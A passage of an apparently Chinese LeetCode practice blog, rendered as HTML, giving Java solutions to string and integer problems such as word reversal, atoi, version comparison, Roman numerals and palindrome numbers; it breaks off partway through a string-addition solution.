class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] chars = s.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> n = chars.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(chars[left] != <span class="string">' '</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> right = left;</span><br><span class="line">                <span class="keyword">while</span>(right + <span class="number">1</span> &lt; n &amp;&amp; chars[right + <span class="number">1</span>] != <span class="string">' '</span>)&#123;</span><br><span class="line">                    right++;</span><br><span class="line">                &#125;</span><br><span class="line">                reverse(chars, left, right);</span><br><span class="line">                left = right+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(chars);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span>[] chars, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="keyword">char</span> temp = chars[right];</span><br><span class="line">            chars[right] = chars[left];</span><br><span class="line">            chars[left] = temp;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-最后一个单词的长度"><a href="#8-最后一个单词的长度" class="headerlink" title="8. 最后一个单词的长度"></a>8. 最后一个单词的长度</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = s.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (s.charAt(index) == <span class="string">' '</span>) &#123;</span><br><span class="line">            index--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> wordLength = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &gt;= <span class="number">0</span> &amp;&amp; s.charAt(index) != <span class="string">' '</span>) &#123;</span><br><span class="line">            wordLength++;</span><br><span class="line">            index--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> wordLength;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-字符串转换整数"><a href="#9-字符串转换整数" class="headerlink" title="9. 字符串转换整数"></a>9. 字符串转换整数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自动机</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">myAtoi</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        Automaton automaton = <span class="keyword">new</span> Automaton();</span><br><span class="line">        <span class="keyword">int</span> length = str.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            automaton.get(str.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) (automaton.sign * automaton.ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Automaton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sign = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> String state = <span class="string">"start"</span>;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String[]&gt; table = <span class="keyword">new</span> HashMap&lt;String, String[]&gt;() &#123;&#123;</span><br><span class="line">        put(<span class="string">"start"</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"start"</span>, <span class="string">"signed"</span>, <span class="string">"in_number"</span>, <span class="string">"end"</span>&#125;);</span><br><span class="line">        put(<span class="string">"signed"</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"end"</span>, <span class="string">"end"</span>, <span class="string">"in_number"</span>, <span class="string">"end"</span>&#125;);</span><br><span class="line">        put(<span class="string">"in_number"</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"end"</span>, <span class="string">"end"</span>, <span class="string">"in_number"</span>, <span class="string">"end"</span>&#125;);</span><br><span class="line">        put(<span class="string">"end"</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"end"</span>, <span class="string">"end"</span>, <span class="string">"end"</span>, <span class="string">"end"</span>&#125;);</span><br><span class="line">    &#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">        state = table.get(state)[get_col(c)];</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"in_number"</span>.equals(state)) &#123;</span><br><span class="line">            ans = ans * <span class="number">10</span> + c - <span class="string">'0'</span>;</span><br><span class="line">            ans = sign == <span class="number">1</span> ? Math.min(ans, (<span class="keyword">long</span>) Integer.MAX_VALUE) : Math.min(ans, -(<span class="keyword">long</span>) Integer.MIN_VALUE);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"signed"</span>.equals(state)) &#123;</span><br><span class="line">            sign = c == <span class="string">'+'</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">get_col</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">' '</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">'+'</span> || c == <span class="string">'-'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Character.isDigit(c)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-比较版本号"><a href="#10-比较版本号" class="headerlink" title="10. 比较版本号"></a>10. 比较版本号</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareVersion</span><span class="params">(String version1, String version2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = version1.length(), m = version2.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n || j &lt; m) &#123;</span><br><span class="line">            <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (; i &lt; n &amp;&amp; version1.charAt(i) != <span class="string">'.'</span>; ++i) &#123;</span><br><span class="line">                x = x * <span class="number">10</span> + version1.charAt(i) - <span class="string">'0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ++i; <span class="comment">// 跳过点号</span></span><br><span class="line">            <span class="keyword">int</span> y = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (; j &lt; m &amp;&amp; version2.charAt(j) != <span class="string">'.'</span>; ++j) &#123;</span><br><span class="line">                y = y * <span class="number">10</span> + version2.charAt(j) - <span class="string">'0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ++j; <span class="comment">// 跳过点号</span></span><br><span class="line">            <span class="keyword">if</span> (x != y) &#123;</span><br><span class="line">                <span class="keyword">return</span> x &gt; y ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-整数转罗马数字"><a href="#11-整数转罗马数字" class="headerlink" title="11. 整数转罗马数字"></a>11. 整数转罗马数字</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] values = &#123;<span class="number">1000</span>, <span class="number">900</span>, <span class="number">500</span>, <span class="number">400</span>, <span class="number">100</span>, <span class="number">90</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    String[] symbols = &#123;<span class="string">"M"</span>, <span class="string">"CM"</span>, <span class="string">"D"</span>, <span class="string">"CD"</span>, <span class="string">"C"</span>, <span class="string">"XC"</span>, <span class="string">"L"</span>, <span class="string">"XL"</span>, <span class="string">"X"</span>, <span class="string">"IX"</span>, <span class="string">"V"</span>, <span class="string">"IV"</span>, <span class="string">"I"</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">intToRoman</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        StringBuffer roman = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; values.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> value = values[i];</span><br><span class="line">            String symbol = symbols[i];</span><br><span class="line">            <span class="keyword">while</span> (num &gt;= value) &#123;</span><br><span class="line">                num -= value;</span><br><span class="line">                roman.append(symbol);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> roman.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-罗马数字转整数"><a href="#12-罗马数字转整数" class="headerlink" title="12. 罗马数字转整数"></a>12. 罗马数字转整数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    Map&lt;Character, Integer&gt; symbolValues = <span class="keyword">new</span> HashMap&lt;Character,Integer&gt;()&#123;&#123;</span><br><span class="line">            put(<span class="string">'I'</span>,<span class="number">1</span>);</span><br><span class="line">            put(<span class="string">'V'</span>,<span class="number">5</span>);</span><br><span class="line">            put(<span class="string">'X'</span>,<span class="number">10</span>);</span><br><span class="line">            put(<span class="string">'L'</span>,<span class="number">50</span>);</span><br><span class="line">            put(<span class="string">'C'</span>,<span class="number">100</span>);</span><br><span class="line">            put(<span class="string">'D'</span>,<span class="number">500</span>);</span><br><span class="line">            put(<span class="string">'M'</span>,<span class="number">1000</span>);</span><br><span class="line">        &#125;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">int</span> n = s.length();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">int</span> pre = symbolValues.get(s.charAt(<span class="number">0</span>));</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">           <span class="keyword">int</span> curr = symbolValues.get(s.charAt(i));</span><br><span class="line">           <span class="keyword">if</span>(pre &lt; curr)&#123;</span><br><span class="line">               sum -= pre;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               sum += pre;</span><br><span class="line">           &#125;</span><br><span class="line">           pre = curr;</span><br><span class="line">       &#125;</span><br><span class="line">        sum += pre;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-Z字形变换"><a href="#13-Z字形变换" class="headerlink" title="13. Z字形变换"></a>13. Z字形变换</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//按行访问</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">convert</span><span class="params">(String s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(numRows == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> delta = <span class="number">2</span> * numRows - <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>  n = s.length();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> row = <span class="number">0</span>; row &lt; numRows; row++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> col = <span class="number">0</span>; col + row &lt; n; col += delta)&#123;</span><br><span class="line">                sb.append(s.charAt(col+row));</span><br><span class="line">                <span class="keyword">if</span>(row != <span class="number">0</span> &amp;&amp; row != numRows - <span class="number">1</span> &amp;&amp; col + delta -row &lt; n)&#123;</span><br><span class="line">                    sb.append(s.charAt(col + delta -row));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="刷题第五天"><a href="#刷题第五天" class="headerlink" title="刷题第五天"></a>刷题第五天</h2><h3 id="1-整数反转"><a href="#1-整数反转" class="headerlink" title="1. 整数反转"></a>1. 整数反转</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法二：溢出之后判断</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> pop = x % <span class="number">10</span>;</span><br><span class="line">        x = x / <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">int</span> newRes = res * <span class="number">10</span> + pop;</span><br><span class="line">        <span class="keyword">if</span> ((newRes - pop) / <span class="number">10</span> != res) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        res = newRes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 方法一：溢出之前判断</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> pop = x % <span class="number">10</span>;</span><br><span class="line">        x = x / <span class="number">10</span>;</span><br><span class="line">        <span class="comment">// MAX_VALUE = 2^31 - 1 = 2147483647</span></span><br><span class="line">        <span class="keyword">if</span> (res &gt; Integer.MAX_VALUE / <span class="number">10</span></span><br><span class="line">            || (res == Integer.MAX_VALUE / <span class="number">10</span> &amp;&amp; pop &gt; <span class="number">7</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// bug 修复：这里是除以 10</span></span><br><span class="line">        <span class="comment">// MIN_VALUE = -2^31 = -2147483648</span></span><br><span class="line">        <span class="keyword">if</span> (res &lt; Integer.MIN_VALUE / <span class="number">10</span></span><br><span class="line">            || (res == Integer.MIN_VALUE  / <span class="number">10</span> &amp;&amp; pop &lt; -<span class="number">8</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        res = res * <span class="number">10</span> + pop;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-回文数"><a href="#2-回文数" class="headerlink" title="2. 回文数"></a>2. 回文数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 特殊情况：</span></span><br><span class="line">        <span class="comment">// 如上所述，当 x &lt; 0 时，x 不是回文数。</span></span><br><span class="line">        <span class="comment">// 同样地，如果数字的最后一位是 0，为了使该数字为回文，</span></span><br><span class="line">        <span class="comment">// 则其第一位数字也应该是 0</span></span><br><span class="line">        <span class="comment">// 只有 0 满足这一属性</span></span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || (x % <span class="number">10</span> == <span class="number">0</span> &amp;&amp; x != <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> revertedNumber = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x &gt; revertedNumber) &#123;</span><br><span class="line">            revertedNumber = revertedNumber * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当数字长度为奇数时，我们可以通过 revertedNumber/10 去除处于中位的数字。</span></span><br><span class="line">        <span class="comment">// 例如，当输入为 12321 时，在 while 循环的末尾我们可以得到 x = 12，revertedNumber = 123，</span></span><br><span class="line">        <span class="comment">// 由于处于中位的数字不影响回文（它总是与自己相等），所以我们可以简单地将其去除。</span></span><br><span class="line">        <span class="keyword">return</span> x == revertedNumber || x == revertedNumber / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-数组形式的整数加法"><a href="#3-数组形式的整数加法" class="headerlink" title="3. 数组形式的整数加法"></a>3. 数组形式的整数加法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">addToArrayForm</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> K)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> l1 = A.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l1 &gt;= <span class="number">0</span> || K != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> x = l1 &lt; <span class="number">0</span> ? <span class="number">0</span> : A[l1];</span><br><span class="line">            <span class="keyword">int</span> y = K == <span class="number">0</span> ? <span class="number">0</span> : K % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> sum = x + y + carry;</span><br><span class="line">            res.add(sum % <span class="number">10</span>);</span><br><span class="line">            carry = sum / <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">            l1--;</span><br><span class="line">            K = K / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (carry != <span class="number">0</span>) res.add(carry);</span><br><span class="line">        Collections.reverse(res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-加一"><a href="#4-加一" class="headerlink" title="4. 加一"></a>4. 加一</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] plusOne(<span class="keyword">int</span>[] digits) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = digits.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            digits[i]++;</span><br><span class="line">            digits[i] = digits[i] % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (digits[i] != <span class="number">0</span>) <span class="keyword">return</span> digits;</span><br><span class="line">        &#125;</span><br><span class="line">        digits = <span class="keyword">new</span> <span class="keyword">int</span>[digits.length + <span class="number">1</span>];</span><br><span class="line">        digits[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> digits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-字符串相加"><a href="#5-字符串相加" class="headerlink" title="5.  字符串相加"></a>5.  字符串相加</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addStrings</span><span class="params">(String num1, String num2)</span> </span>&#123;</span><br><span class="line">    StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> l1 = num1.length() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> l2 = num2.length() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l1 &gt;= <span class="number">0</span> || l2 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> x = l1 &lt; <span class="number">0</span> ? <span class="number">0</span> : num1.charAt(l1) - <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">int</span> y = l2 &lt; <span class="number">0</span> ? <span class="number">0</span> : num2.charAt(l2) - <span class="string">'0'</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> sum = x + y + carry;</span><br><span class="line">        res.append(sum % <span class="number">10</span>);</span><br><span class="line">        carry 